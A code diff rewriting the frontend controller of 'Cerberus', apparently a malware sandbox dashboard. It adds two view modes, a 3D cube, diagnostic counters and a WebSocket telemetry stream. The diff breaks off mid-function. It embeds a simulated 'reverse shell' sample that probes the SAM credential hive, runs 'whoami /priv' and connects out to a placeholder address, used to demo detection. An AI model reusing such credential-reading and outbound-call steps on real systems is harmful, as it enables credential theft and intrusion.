@@ -1,350 +1,228 @@
 /**
- * Cerberus 3D Defense Core - Integrated Frontend Controller
- * Connects the Stitch Remix 3D cockpit to the Cerberus backend API & WebSocket stream.
- * Manages 6-stage pipeline transitions, real-time ETW event rendering,
- * dynamic Three.js / CSS 3D viewport state, and containment alerts.
+ * Cerberus Runtime Defense Machine - Dual-Mode Frontend Controller
+ * - Front Page (Standby): stitch_remix_1 layout with candidate dropper & enclave matrix
+ * - Upload/Analysis State: stitch_remix_2 layout with 3D layered ortho-strata,
+ *   real-time BPF telemetry stream, diagnostic matrix, and slide-to-confirm emergency kill slider.
  */
 
 document.addEventListener('DOMContentLoaded', () => {
-  // DOM Elements - Navigation & Status
+  // Navigation & Host Status Elements
   const statusWsb = document.getElementById('status-wsb');
-  const statusProbes = document.getElementById('status-probes');
-
-  // Workload Dropper & File Input
-  const fileUploadBtn = document.getElementById('fileUploadBtn');
+  const viewStandby = document.getElementById('view-standby');
+  const viewActiveAnalysis = document.getElementById('view-active-analysis');
   const fileInput = document.getElementById('file-input');
+  const btnReturnStandby = document.getElementById('btn-return-standby');
+
+  // Standby Elements (stitch_remix_1)
+  const fileUploadBtn = document.getElementById('fileUploadBtn');
   const activeWorkloadLabel = document.getElementById('activeWorkloadLabel');
   const activeWorkloadBadge = document.getElementById('activeWorkloadBadge');
-
-  // Pipeline Stepper Buttons
-  const stepBtns = document.querySelectorAll('.state-step-btn');
-
-  // Payload Selectors & Run Button
-  const payloadBtns = document.querySelectorAll('.payload-btn');
   const btnExecuteCycle = document.getElementById('btn-execute-cycle');
-
-  // 3D Core Viewport & HUD Elements
+  const payloadBtns = document.querySelectorAll('.payload-btn');
+  const standbyCentralCube = document.getElementById('centralCoreCube');
   const spatialSceneWrapper = document.getElementById('spatialSceneWrapper');
-  const centralCoreCube = document.getElementById('centralCoreCube');
-  const cubeIconState = document.getElementById('cubeIconState');
-  const cubeCenterTitle = document.getElementById('cubeCenterTitle');
-  const cubeCenterSub = document.getElementById('cubeCenterSub');
-  const cubeCenterPid = document.getElementById('cubeCenterPid');
-  const containmentClamps = document.getElementById('containmentClamps');
-  const threatStatusPill = document.getElementById('threatStatusPill');
-  const explodedLayersContainer = document.getElementById('explodedLayersContainer');
-  const toggleExplodedBtn = document.getElementById('toggleExplodedBtn');
-  const explodedBtnText = document.getElementById('explodedBtnText');
+  const btnResetPerspective = document.getElementById('btn-reset-perspective');
+  const standbySyscallBox = document.getElementById('syscallStreamBox');
+  const standbySyscallCounter = document.getElementById('syscallCounter');
+  const standbyLatencyCounter = document.getElementById('latencyCounter');
+  const standbyManualContain = document.getElementById('btn-manual-contain');
 
-  // State Banner Elements
-  const stateBannerTitle = document.getElementById('stateBannerTitle');
-  const stateBannerDesc = document.getElementById('stateBannerDesc');
-  const stateBannerCode = document.getElementById('stateBannerCode');
-  const stateBannerIcon = document.getElementById('stateBannerIcon');
+  // Active Analysis Elements (stitch_remix_2)
+  const activeTargetTitle = document.getElementById('active-target-title');
+  const activeTargetStatusBadge = document.getElementById('active-target-status-badge');
+  const activePidBadge = document.getElementById('active-pid-badge');
+  const activeSandboxLabel = document.getElementById('active-sandbox-label');
+  const activeMemDisplay = document.getElementById('active-mem-display');
+  const activeCpuDisplay = document.getElementById('active-cpu-display');
+  const activeContainDisplay = document.getElementById('active-contain-display');
+  const enclaveCube = document.getElementById('enclave-cube');
+  const activeDetectNode = document.getElementById('active-detect-node');
+  const activeDetectIcon = document.getElementById('active-detect-icon');
+  const activeDetectTitle = document.getElementById('active-detect-title');
+  const activeDetectSub = document.getElementById('active-detect-sub');
+  const activeDetectBadge = document.getElementById('active-detect-badge');
+  const activeSeccompStatus = document.getElementById('active-seccomp-status');
+  const activeVerdictPlaneTitle = document.getElementById('active-verdict-plane-title');
+  const activeVerdictHash = document.getElementById('active-verdict-hash');
+  const activeSyscallBox = document.getElementById('active-syscall-box');
 
-  // Telemetry Terminal / Stream Elements
-  const syscallStreamBox = document.getElementById('syscallStreamBox');
-  const syscallCounter = document.getElementById('syscallCounter');
-  const latencyCounter = document.getElementById('latencyCounter');
-  const filterBtns = document.querySelectorAll('.stream-filter-btn');
-  const autoscrollChk = document.getElementById('autoscroll-chk');
-  const btnManualContain = document.getElementById('btn-manual-contain');
+  // Active Diagnostic Counters
+  const diagInodeWrites = document.getElementById('diag-inode-writes');
+  const diagForkDepth = document.getElementById('diag-fork-depth');
+  const diagMemoryResident = document.getElementById('diag-memory-resident');
+  const diagThreatScore = document.getElementById('diag-threat-score');
+  const activeContainmentBadge = document.getElementById('active-containment-badge');
 
-  // Verdict Box Elements
-  const verdictSummaryBox = document.getElementById('verdictSummaryBox');
-  const verdictBadge = document.getElementById('verdictBadge');
-  const verdictDetailText = document.getElementById('verdictDetailText');
+  // Pipeline Indicators (Active View)
+  const pipeStage4 = document.getElementById('pipe-stage-4');
+  const pipeDetectLabel = document.getElementById('pipe-detect-label');
+  const pipeStage5 = document.getElementById('pipe-stage-5');
+  const pipeContainLabel = document.getElementById('pipe-contain-label');
+  const pipeStage6 = document.getElementById('pipe-stage-6');
+  const pipeVerdictLabel = document.getElementById('pipe-verdict-label');
 
-  // State
-  let currentState = 'upload';
-  let isExploded = false;
+  // Rotation HUD Controls
+  const btnRotateLeft = document.getElementById('btn-rotate-left');
+  const btnRotateRight = document.getElementById('btn-rotate-right');
+  const btnResetCoreView = document.getElementById('btn-reset-core-view');
+  const btnFocusTarget = document.getElementById('btn-focus-target');
+  const yawVal = document.getElementById('yaw-val');
+  const pitchVal = document.getElementById('pitch-val');
+  const zoomVal = document.getElementById('zoom-val');
+
+  // Slide-to-Confirm Emergency Kill Slider Elements
+  const sliderTrack = document.getElementById('kill-slider-track');
+  const sliderHandle = document.getElementById('kill-slider-handle');
+  const sliderProgress = document.getElementById('slider-progress');
+  const sliderTrackText = document.getElementById('slider-track-text');
+  const handleIcon = document.getElementById('handle-icon');
+
+  // Application State
   let activeSocket = null;
   let timerInterval = null;
   let startTime = null;
   let totalEvents = 0;
-  let currentFilter = 'all';
   let activeSessionId = null;
   let activeTargetPid = null;
-  let activeFilename = 'Awaiting Ingest';
-  let selectedPayloadType = 'rev_shell';
+  let currentSelectedPayload = 'rev_shell';
 
-  // Three.js Scene References
-  let threeCore = null;
+  // 3D Viewport Transform State for Layered Ortho-Strata Cube
+  let yaw = -34;
+  let pitch = 24;
+  let zoom = 1.0;
+  let isFocused = false;
 
   // -------------------------------------------------------------
-  // 1. Initialize Host Status & Probes
+  // 1. Host System Status
   // -------------------------------------------------------------
-  function checkSystemStatus() {
+  function fetchSystemStatus() {
     fetch('/api/system/status')
-      .then(res => res.json())
-      .then(status => {
+      .then(r => r.json())
+      .then(st => {
         if (statusWsb) {
-          if (status.available) {
+          if (st.available) {
             statusWsb.innerHTML = `
               <span class="w-2 h-2 rounded-full bg-emerald-500 animate-pulse"></span>
               <span class="font-label-sm text-label-sm font-medium">SANDBOX: <span class="text-emerald-600 font-bold">ISOLATED VM</span></span>
             `;
+            if (activeSandboxLabel) activeSandboxLabel.textContent = 'ISOLATED_VM_WSB';
           } else {
             statusWsb.innerHTML = `
               <span class="w-2 h-2 rounded-full bg-amber-500 animate-pulse"></span>
-              <span class="font-label-sm text-label-sm font-medium" title="${escapeHtml(status.message || 'Host Job Object fallback')}">
+              <span class="font-label-sm text-label-sm font-medium" title="${escapeHtml(st.message || 'Host Job Object fallback')}">
                 SANDBOX: <span class="text-amber-600 font-bold">HOST JOB-OBJECT</span>
               </span>
             `;
+            if (activeSandboxLabel) activeSandboxLabel.textContent = 'HOST_JOB_OBJECT';
           }
         }
       })
-      .catch(err => {
-        console.warn('Unable to query system status:', err);
-      });
+      .catch(err => console.warn('Status query failed:', err));
   }
-  checkSystemStatus();
+  fetchSystemStatus();
 
   // -------------------------------------------------------------
-  // 2. Cerberus State Machine Definition
+  // 2. View Switching: Standby vs Active Analysis
   // -------------------------------------------------------------
-  const STAGE_CONFIG = {
-    upload: {
-      stepIndex: 1,
-      title: "STAGE 1: UPLOAD & INGESTION",
-      desc: "Payload staged in memory. Cryptographic hash computed. Zero execution rights.",
-      code: "STAGE::01",
-      icon: "cloud_upload",
-      cubeIcon: "shield",
-      cubeTitle: "ENCLAVE α",
-      cubeSub: "AWAITING INGEST",
-      pillText: "ENCLAVE: PREPARED",
-      pillClass: "bg-surface-container-high text-on-surface",
-      clamps: false,
-      verdictText: "Awaiting execution trigger. File sha256 checksum calculated.",
-      verdictBadge: "READY",
-      verdictBadgeClass: "bg-surface-container-high text-on-surface",
-      theme: "neutral"
-    },
-    isolate: {
-      stepIndex: 2,
-      title: "STAGE 2: EPHEMERAL ISOLATION",
-      desc: "Mounted disposable sandbox container / Job Object memory quota bounds enforced.",
-      code: "STAGE::02",
-      icon: "view_in_ar",
-      cubeIcon: "folder_zip",
-      cubeTitle: "ISOLATED ENCLAVE",
-      cubeSub: "JOB OBJECT ATTACHED",
-      pillText: "ENCLAVE: ACTIVE",
-      pillClass: "bg-primary-fixed text-on-primary-fixed-variant",
-      clamps: false,
-      verdictText: "Target staged inside isolated environment with strict resource limits.",
-      verdictBadge: "ISOLATED",
-      verdictBadgeClass: "bg-primary-fixed text-on-primary-fixed-variant",
-      theme: "primary"
-    },
-    observe: {
-      stepIndex: 3,
-      title: "STAGE 3: RUNTIME OBSERVATION",
-      desc: "Target executing under ETW kernel tracepoints. Telemetry engine monitoring File, Network, Process.",
-      code: "STAGE::03",
-      icon: "visibility",
-      cubeIcon: "troubleshoot",
-      cubeTitle: "ETW PROBES LIVE",
-      cubeSub: "TELEMETRY STREAMING",
-      pillText: "TELEMETRY: ACTIVE",
-      pillClass: "bg-secondary-fixed text-on-secondary-fixed-variant",
-      clamps: false,
-      verdictText: "Monitoring system call activity, thread creations, and outbound network connect attempts.",
-      verdictBadge: "OBSERVING",
-      verdictBadgeClass: "bg-secondary-fixed text-on-secondary-fixed-variant",
-      theme: "secondary"
-    },
-    detect: {
-      stepIndex: 4,
-      title: "STAGE 4: DECISION NEXUS DETECT",
-      desc: "SECURITY POLICY BREACH: Malicious behavior detected in real-time kernel telemetry.",
-      code: "STAGE::04",
-      icon: "warning",
-      cubeIcon: "report",
-      cubeTitle: "THREAT FLAGGED",
-      cubeSub: "VIOLATION DETECTED",
-      pillText: "THREAT IDENTIFIED",
-      pillClass: "bg-error-container text-on-error-container animate-pulse",
-      clamps: false,
-      verdictText: "Decision Nexus identified high-severity policy trip. Preparing containment response.",
-      verdictBadge: "BREACH FLAGGED",
-      verdictBadgeClass: "bg-error-container text-on-error-container",
-      theme: "threat"
-    },
-    contain: {
-      stepIndex: 5,
-      title: "STAGE 5: CONTAINMENT INTERCEPT",
-      desc: "Instant stasis enforced: Threads suspended via SuspendThread, outbound network severed via WFP.",
-      code: "STAGE::05",
-      icon: "lock",
-      cubeIcon: "lock",
-      cubeTitle: "LOCKED & FROZEN",
-      cubeSub: "STASIS INTERCEPT",
-      pillText: "CONTAINED (0.04ms)",
-      pillClass: "bg-tertiary-container text-on-tertiary-container font-bold",
-      clamps: true,
-      verdictText: "Threat execution halted at kernel boundary. Outbound traffic severed before packet escape.",
-      verdictBadge: "CONTAINED",
-      verdictBadgeClass: "bg-tertiary-container text-on-tertiary-container",
-      theme: "contained"
-    },
-    verdict: {
-      stepIndex: 6,
-      title: "STAGE 6: FORENSIC VERDICT",
-      desc: "Sandbox analysis concluded. Cryptographic forensic audit generated. Host filesystem pristine.",
-      code: "STAGE::06",
-      icon: "verified",
-      cubeIcon: "gavel",
-      cubeTitle: "HOST PROTECTED",
-      cubeSub: "ZERO RESIDUE",
-      pillText: "AUDIT: COMPLETED",
-      pillClass: "bg-primary text-on-primary",
-      clamps: true,
-      verdictText: "Analysis finalized. All telemetry logged to audit store.",
-      verdictBadge: "SAFE VERDICT",
-      verdictBadgeClass: "bg-primary text-on-primary",
-      theme: "verdict"
+  function switchToActiveView(filename, pid) {
+    if (viewStandby) viewStandby.classList.add('hidden');
+    if (viewActiveAnalysis) viewActiveAnalysis.classList.remove('hidden');
+
+    if (activeTargetTitle) activeTargetTitle.textContent = filename;
+    if (activeTargetStatusBadge) {
+      activeTargetStatusBadge.textContent = 'ANALYZING';
+      activeTargetStatusBadge.className = 'font-label-sm text-label-sm bg-primary text-on-primary px-1 py-0.5 rounded animate-pulse';
     }
-  };
+    if (activePidBadge) activePidBadge.textContent = `PID: ${pid} [JAIL]`;
 
-  function setCerberusState(stateKey, customDesc, customVerdict) {
-    currentState = stateKey;
-    const data = STAGE_CONFIG[stateKey];
-    if (!data) return;
-
-    // 1. Update Stepper Buttons
-    stepBtns.forEach(btn => {
-      const step = btn.getAttribute('data-step');
-      const dot = btn.querySelector('.step-dot');
-      if (step === stateKey) {
-        btn.className = "state-step-btn active px-space-md py-1.5 rounded-full font-label-sm text-label-sm uppercase font-semibold transition-all duration-200 flex items-center gap-1 bg-primary text-on-primary shadow-sm";
-        if (dot) dot.className = "step-dot w-1.5 h-1.5 rounded-full bg-surface-container-lowest";
-      } else {
-        btn.className = "state-step-btn px-space-md py-1.5 rounded-full font-label-sm text-label-sm uppercase font-medium text-on-surface-variant hover:bg-surface-container-high hover:text-on-surface transition-all duration-200 flex items-center gap-1";
-        if (dot) dot.className = "step-dot w-1.5 h-1.5 rounded-full bg-outline-variant";
-      }
-    });
-
-    // 2. Update Central 3D Cube Annotation
-    if (cubeIconState) cubeIconState.textContent = data.cubeIcon;
-    if (cubeCenterTitle) cubeCenterTitle.textContent = data.cubeTitle;
-    if (cubeCenterSub) cubeCenterSub.textContent = data.cubeSub;
-    if (cubeCenterPid && activeTargetPid) {
-      cubeCenterPid.textContent = `PID: ${activeTargetPid} :: ACTIVE`;
+    // Reset diagnostic values to baseline
+    if (diagInodeWrites) diagInodeWrites.textContent = '0';
+    if (diagForkDepth) diagForkDepth.textContent = '1';
+    if (diagMemoryResident) diagMemoryResident.textContent = '14.2 MB';
+    if (diagThreatScore) {
+      diagThreatScore.textContent = '0/100';
+      diagThreatScore.className = 'font-headline-sm text-headline-sm text-primary font-bold';
+    }
+    if (activeContainmentBadge) {
+      activeContainmentBadge.textContent = 'MONITORING';
+      activeContainmentBadge.className = 'font-label-sm text-label-sm bg-primary-fixed text-on-primary-fixed px-space-xs py-0.5 rounded font-mono font-bold';
     }
 
-    // 3. Update Containment Clamps
-    if (containmentClamps) {
-      if (data.clamps) {
-        containmentClamps.classList.remove('opacity-0', 'scale-90');
-        containmentClamps.classList.add('opacity-100', 'scale-100');
-      } else {
-        containmentClamps.classList.remove('opacity-100', 'scale-100');
-        containmentClamps.classList.add('opacity-0', 'scale-90');
-      }
+    // Reset detect node
+    if (activeDetectNode) {
+      activeDetectNode.style.boxShadow = 'inset 0 0 0 1px rgba(0, 97, 148, 0.4)';
+    }
+    if (activeDetectIcon) {
+      activeDetectIcon.textContent = 'troubleshoot';
+      activeDetectIcon.className = 'material-symbols-outlined text-primary text-[28px] animate-pulse';
+    }
+    if (activeDetectTitle) {
+      activeDetectTitle.textContent = 'PROBES ACTIVE';
+      activeDetectTitle.className = 'font-label-md text-label-md font-bold text-primary mt-1';
+    }
+    if (activeDetectSub) {
+      activeDetectSub.textContent = 'ETW KERNEL HOOKS ARMED';
+    }
+    if (activeDetectBadge) {
+      activeDetectBadge.className = 'font-label-sm text-label-sm text-primary font-semibold flex items-center gap-1';
+      activeDetectBadge.innerHTML = `<span class="w-1.5 h-1.5 rounded-full bg-primary animate-ping"></span> STREAMING`;
     }
 
-    // 4. Update State Banner
-    if (stateBannerTitle) stateBannerTitle.textContent = data.title;
-    if (stateBannerDesc) stateBannerDesc.textContent = customDesc || data.desc;
-    if (stateBannerCode) stateBannerCode.textContent = data.code;
-    if (stateBannerIcon) stateBannerIcon.textContent = data.icon;
-
-    // 5. Update Threat Status Pill
-    if (threatStatusPill) {
-      threatStatusPill.className = `font-label-sm text-label-sm px-2.5 py-1 rounded-full font-mono font-bold uppercase transition-all flex items-center gap-1.5 ${data.pillClass}`;
-      threatStatusPill.innerHTML = `<span class="w-2 h-2 rounded-full bg-current"></span> ${data.pillText}`;
+    // Reset Pipeline stages
+    if (pipeStage4) pipeStage4.className = 'flex flex-col gap-1 p-2 rounded bg-surface-container-low';
+    if (pipeDetectLabel) pipeDetectLabel.textContent = 'MONITORING';
+    if (pipeStage5) pipeStage5.className = 'flex flex-col gap-1 p-2 rounded bg-surface-container-low';
+    if (pipeContainLabel) pipeContainLabel.textContent = 'STANDBY';
+    if (pipeStage6) {
+      pipeStage6.className = 'flex flex-col gap-1 p-2 rounded bg-surface-container-low text-on-surface';
     }
+    if (pipeVerdictLabel) pipeVerdictLabel.textContent = 'PENDING';
 
-    // 6. Update Verdict Box
-    if (verdictDetailText) {
-      verdictDetailText.textContent = customVerdict || data.verdictText;
-    }
-    if (verdictBadge) {
-      verdictBadge.textContent = data.verdictBadge;
-      verdictBadge.className = `font-label-sm text-label-sm px-2 py-0.5 rounded font-mono font-bold ${data.verdictBadgeClass}`;
-    }
+    // Clear active log
+    if (activeSyscallBox) activeSyscallBox.innerHTML = '';
 
-    // 7. Update Three.js Core Color Scheme
-    if (threeCore) {
-      threeCore.updateState(data.theme);
+    // Reset 3D cube perspective
+    resetCoreView();
+  }
+
+  function switchToStandbyView() {
+    if (activeSocket) {
+      activeSocket.close();
+      activeSocket = null;
+    }
+    clearInterval(timerInterval);
+
+    if (viewActiveAnalysis) viewActiveAnalysis.classList.add('hidden');
+    if (viewStandby) viewStandby.classList.remove('hidden');
+
+    if (activeWorkloadLabel) {
+      activeWorkloadLabel.textContent = 'Click or drop payload script...';
+    }
+    if (activeWorkloadBadge) {
+      activeWorkloadBadge.textContent = 'STANDBY';
     }
   }
 
-  // -------------------------------------------------------------
-  // 3. File Upload & Ingestion Logic
-  // -------------------------------------------------------------
-  if (fileUploadBtn && fileInput) {
-    fileUploadBtn.addEventListener('click', (e) => {
-      e.stopPropagation();
-      fileInput.click();
-    });
-
-    fileInput.addEventListener('change', (e) => {
-      if (e.target.files && e.target.files.length > 0) {
-        uploadFile(e.target.files[0]);
-      }
-    });
-
-    // Drag and Drop
-    ['dragenter', 'dragover'].forEach(eventName => {
-      fileUploadBtn.addEventListener(eventName, (e) => {
-        e.preventDefault();
-        e.stopPropagation();
-        fileUploadBtn.classList.add('ring-2', 'ring-primary');
-      }, false);
-    });
-
-    ['dragleave', 'drop'].forEach(eventName => {
-      fileUploadBtn.addEventListener(eventName, (e) => {
-        e.preventDefault();
-        e.stopPropagation();
-        fileUploadBtn.classList.remove('ring-2', 'ring-primary');
-      }, false);
-    });
-
-    fileUploadBtn.addEventListener('drop', (e) => {
-      const dt = e.dataTransfer;
-      if (dt && dt.files && dt.files.length > 0) {
-        uploadFile(dt.files[0]);
-      }
-    });
-  }
-
-  // Also support dropping anywhere on spatial scene
-  if (spatialSceneWrapper) {
-    ['dragenter', 'dragover'].forEach(evt => {
-      spatialSceneWrapper.addEventListener(evt, (e) => {
-        e.preventDefault();
-        e.stopPropagation();
-      });
-    });
-    spatialSceneWrapper.addEventListener('drop', (e) => {
-      e.preventDefault();
-      e.stopPropagation();
-      if (e.dataTransfer && e.dataTransfer.files && e.dataTransfer.files.length > 0) {
-        uploadFile(e.dataTransfer.files[0]);
-      }
-    });
+  if (btnReturnStandby) {
+    btnReturnStandby.addEventListener('click', switchToStandbyView);
   }
 
   // -------------------------------------------------------------
-  // 4. Sample Payload Presets & Execution
+  // 3. Standby Preset Payloads & Selection
   // -------------------------------------------------------------
   const PAYLOAD_PRESETS = {
     rev_shell: {
-      filename: "suspicious_payload_sample.ps1",
+      filename: "suspicious_payload.ps1",
       displayName: "reverse_shell.py",
       content: `# Cerberus Malicious Simulation Payload
 Probe-CredentialHive -Path "C:\\Windows\\System32\\config\\SAM"
 Start-Process "cmd.exe" -ArgumentList "/c whoami /priv"
 Connect-Outbound -Destination "198.51.100.42:443"
 `,
-      type: "MALICIOUS"
+      tag: "MALICIOUS"
     },
     buffer_probe: {
-      filename: "buffer_probe_sample.c",
+      filename: "buffer_probe.c",
       displayName: "buffer_probe.c",
       content: `// Memory probe taint evaluation
 #include <windows.h>
@@ -353,7 +231,7 @@ int main() {
     return 0;
 }
 `,
-      type: "TAINT RISK"
+      tag: "TAINT RISK"
     },
     clean_eval: {
       filename: "clean_worker_benchmark.bat",
@@ -363,7 +241,7 @@ echo Cerberus Clean Benchmark Run
 set /a x=1024 * 768
 echo Result: %x%
 `,
-      type: "BENIGN"
+      tag: "BENIGN"
     }
   };
 
@@ -375,7 +253,7 @@ echo Result: %x%
   });
 
   function selectPayload(type) {
-    selectedPayloadType = type;
+    currentSelectedPayload = type;
     payloadBtns.forEach(b => {
       const isCur = b.getAttribute('data-payload') === type;
       if (isCur) {
@@ -393,93 +271,128 @@ echo Result: %x%
 
   if (btnExecuteCycle) {
     btnExecuteCycle.addEventListener('click', () => {
-      const preset = PAYLOAD_PRESETS[selectedPayloadType] || PAYLOAD_PRESETS.rev_shell;
+      const preset = PAYLOAD_PRESETS[currentSelectedPayload] || PAYLOAD_PRESETS.rev_shell;
       const file = new File([preset.content], preset.filename, { type: 'text/plain' });
-      uploadFile(file);
+      handleFileUpload(file);
     });
   }
 
   // -------------------------------------------------------------
-  // 5. Upload & Session Launch Controller
+  // 4. File Dropper & Native File Upload
   // -------------------------------------------------------------
-  async function uploadFile(file) {
-    resetAnalysisSession(file.name);
+  if (fileUploadBtn && fileInput) {
+    fileUploadBtn.addEventListener('click', (e) => {
+      e.stopPropagation();
+      fileInput.click();
+    });
 
+    fileInput.addEventListener('change', (e) => {
+      if (e.target.files && e.target.files.length > 0) {
+        handleFileUpload(e.target.files[0]);
+      }
+    });
+
+    // Drag and drop
+    ['dragenter', 'dragover'].forEach(ev => {
+      fileUploadBtn.addEventListener(ev, (e) => {
+        e.preventDefault();
+        e.stopPropagation();
+        fileUploadBtn.classList.add('ring-2', 'ring-primary');
+      });
+    });
+
+    ['dragleave', 'drop'].forEach(ev => {
+      fileUploadBtn.addEventListener(ev, (e) => {
+        e.preventDefault();
+        e.stopPropagation();
+        fileUploadBtn.classList.remove('ring-2', 'ring-primary');
+      });
+    });
+
+    fileUploadBtn.addEventListener('drop', (e) => {
+      if (e.dataTransfer && e.dataTransfer.files && e.dataTransfer.files.length > 0) {
+        handleFileUpload(e.dataTransfer.files[0]);
+      }
+    });
+  }
+
+  if (spatialSceneWrapper) {
+    ['dragenter', 'dragover'].forEach(ev => {
+      spatialSceneWrapper.addEventListener(ev, (e) => {
+        e.preventDefault();
+        e.stopPropagation();
+      });
+    });
+    spatialSceneWrapper.addEventListener('drop', (e) => {
+      e.preventDefault();
+      e.stopPropagation();
+      if (e.dataTransfer && e.dataTransfer.files && e.dataTransfer.files.length > 0) {
+        handleFileUpload(e.dataTransfer.files[0]);
+      }
+    });
+  }
+
+  // -------------------------------------------------------------
+  // 5. File Upload API & Telemetry WebSocket Hook
+  // -------------------------------------------------------------
+  async function handleFileUpload(file) {
     const formData = new FormData();
     formData.append('file', file);
 
-    try {
-      setCerberusState('isolate', `Staging target payload '${file.name}' inside disposable Windows Sandbox environment.`);
+    // Switch view to stitch_remix_2 immediately!
+    switchToActiveView(file.name, 'Allocating...');
 
+    totalEvents = 0;
+    startTime = Date.now();
+    timerInterval = setInterval(() => {
+      const elapsed = ((Date.now() - startTime) / 1000).toFixed(2);
+      if (standbyLatencyCounter) standbyLatencyCounter.textContent = `${elapsed}s`;
+    }, 50);
+
+    appendActiveLog({
+      timestamp: formatTimestamp(),
+      call: `sys_execve("${escapeHtml(file.name)}")`,
+      status: "INIT",
+      type: "info"
+    });
+
+    try {
       const response = await fetch('/api/upload', {
         method: 'POST',
         body: formData,
       });
 
       if (!response.ok) {
-        throw new Error(`Server returned HTTP ${response.status}: ${response.statusText}`);
+        throw new Error(`Upload failed: ${response.statusText}`);
       }
 
       const session = await response.json();
       activeSessionId = session.session_id;
       activeTargetPid = session.target_pid;
 
-      if (activeWorkloadLabel) {
-        activeWorkloadLabel.textContent = `${file.name} (PID: ${session.target_pid})`;
-      }
-      if (cubeCenterPid) {
-        cubeCenterPid.textContent = `PID: ${session.target_pid} :: ACTIVE`;
-      }
+      if (activePidBadge) activePidBadge.textContent = `PID: ${session.target_pid} [JAIL]`;
 
-      appendStreamEvent({
+      appendActiveLog({
         timestamp: formatTimestamp(),
-        category: 'SYS',
-        severity: 'info',
-        title: 'SESSION_INITIALIZED',
-        description: `Session '${session.session_id}' launched. Target PID: ${session.target_pid}. FallbackHostMode: ${session.fallback_host_mode}`
+        call: `cgroup_jail_attach(pid=${session.target_pid})`,
+        status: "BOUND",
+        type: "info"
       });
 
-      // Connect real-time telemetry WebSocket
-      connectTelemetryWebSocket(session.session_id);
+      connectWebSocket(session.session_id);
     } catch (err) {
-      console.error('Upload error:', err);
-      setCerberusState('verdict', `Analysis launch failed: ${err.message}`, 'LAUNCH ERROR');
-      appendStreamEvent({
+      console.error('Launch failure:', err);
+      appendActiveLog({
         timestamp: formatTimestamp(),
-        category: 'SYS',
-        severity: 'critical',
-        title: 'LAUNCH_ERROR',
-        description: err.message
+        call: `launch_error("${escapeHtml(err.message)}")`,
+        status: "FAILED",
+        type: "error"
       });
       clearInterval(timerInterval);
     }
   }
 
-  function resetAnalysisSession(filename) {
-    if (activeSocket) {
-      activeSocket.close();
-      activeSocket = null;
-    }
-    clearInterval(timerInterval);
-
-    totalEvents = 0;
-    activeFilename = filename;
-    if (syscallCounter) syscallCounter.textContent = '0';
-    if (syscallStreamBox) syscallStreamBox.innerHTML = '';
-
-    startTime = Date.now();
-    timerInterval = setInterval(() => {
-      const elapsed = ((Date.now() - startTime) / 1000).toFixed(2);
-      if (latencyCounter) latencyCounter.textContent = `${elapsed}s`;
-    }, 50);
-
-    setCerberusState('upload', `Payload '${filename}' uploaded. Initializing ephemeral containment enclave.`);
-  }
-
-  // -------------------------------------------------------------
-  // 6. WebSocket Live Telemetry Ingestion
-  // -------------------------------------------------------------
-  function connectTelemetryWebSocket(sessionId) {
+  function connectWebSocket(sessionId) {
     const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
     const wsUrl = `${protocol}//${window.location.host}/ws/analysis/${sessionId}`;
 
@@ -487,392 +400,378 @@ echo Result: %x%
 
     activeSocket.onopen = () => {
       console.log(`[Cerberus] Connected to telemetry WebSocket for session ${sessionId}`);
-      setCerberusState('observe');
     };
 
     activeSocket.onmessage = (e) => {
       try {
         const event = JSON.parse(e.data);
-        handleIncomingTelemetryEvent(event);
+        handleTelemetryEvent(event);
       } catch (err) {
-        console.error('Error parsing telemetry JSON:', err);
+        console.error('Error parsing telemetry event:', err);
       }
     };
 
     activeSocket.onclose = () => {
-      console.log('[Cerberus] Telemetry WebSocket channel closed.');
+      console.log('[Cerberus] WebSocket closed.');
       clearInterval(timerInterval);
     };
 
     activeSocket.onerror = (err) => {
-      console.error('[Cerberus] Telemetry WebSocket error:', err);
+      console.error('[Cerberus] WebSocket error:', err);
     };
   }
 
-  function handleIncomingTelemetryEvent(event) {
+  function handleTelemetryEvent(event) {
     totalEvents++;
-    if (syscallCounter) syscallCounter.textContent = String(totalEvents);
+    if (standbySyscallCounter) standbySyscallCounter.textContent = String(totalEvents);
 
-    // Dynamic State Machine Milestones
-    if (event.type === 'SESSION_INIT' || event.type === 'JOB_OBJECT_ATTACH') {
-      setCerberusState('isolate');
-    } else if (event.type === 'PROCESS_START' || event.type === 'TELEMETRY_ENGINE_ACTIVE') {
-      setCerberusState('observe');
-    } else if (
-      event.type === 'FILE_ACCESS_VIOLATION' ||
-      event.type === 'CHILD_PROCESS_VIOLATION' ||
-      event.type === 'NETWORK_VIOLATION' ||
-      event.severity === 'violation'
-    ) {
-      setCerberusState('detect', `Policy breach tripped: ${event.title || event.type}. Immediate interception primed.`);
-    } else if (event.type === 'ACTION_SUSPEND_THREAD' || event.type === 'ACTION_WFP_SEVER' || event.category === 'containment') {
-      setCerberusState('contain', `Threat contained: ${event.description || 'Threads suspended and outbound cut.'}`);
-    } else if (event.type === 'VERDICT') {
+    // Inode, Memory, Fork metrics
+    if (event.category === 'file') {
+      if (diagInodeWrites) {
+        const cur = parseInt(diagInodeWrites.textContent) || 0;
+        diagInodeWrites.textContent = String(cur + 1);
+      }
+    } else if (event.category === 'process') {
+      if (diagForkDepth) {
+        const cur = parseInt(diagForkDepth.textContent) || 1;
+        diagForkDepth.textContent = String(cur + 1);
+      }
+    }
+
+    // Dynamic memory resident simulation
+    if (diagMemoryResident) {
+      const memMb = (16.0 + totalEvents * 1.8).toFixed(1);
+      diagMemoryResident.textContent = `${memMb} MB`;
+      if (activeMemDisplay) activeMemDisplay.textContent = `${memMb} / 128 MB`;
+    }
+
+    // Check for violations / containment
+    const isViolation = event.severity === 'violation' || event.severity === 'critical';
+    const isContainment = event.category === 'containment' || event.type.startsWith('ACTION_');
+
+    if (isViolation || isContainment) {
+      // Elevate Threat Score
+      if (diagThreatScore) {
+        diagThreatScore.textContent = '98/100';
+        diagThreatScore.className = 'font-headline-sm text-headline-sm text-tertiary font-bold animate-pulse';
+      }
+
+      // Update Active Containment Badge
+      if (activeContainmentBadge) {
+        activeContainmentBadge.textContent = 'LOCKDOWN';
+        activeContainmentBadge.className = 'font-label-sm text-label-sm bg-tertiary-fixed text-on-tertiary-fixed px-space-xs py-0.5 rounded font-mono font-bold animate-pulse';
+      }
+
+      // Update Layer 3 Detect Node in the 3D Cube
+      if (activeDetectNode) {
+        activeDetectNode.style.boxShadow = 'inset 0 0 0 1px rgba(220, 38, 38, 0.6), 0 4px 18px rgba(224, 41, 40, 0.3)';
+      }
+      if (activeDetectIcon) {
+        activeDetectIcon.textContent = 'lock_clock';
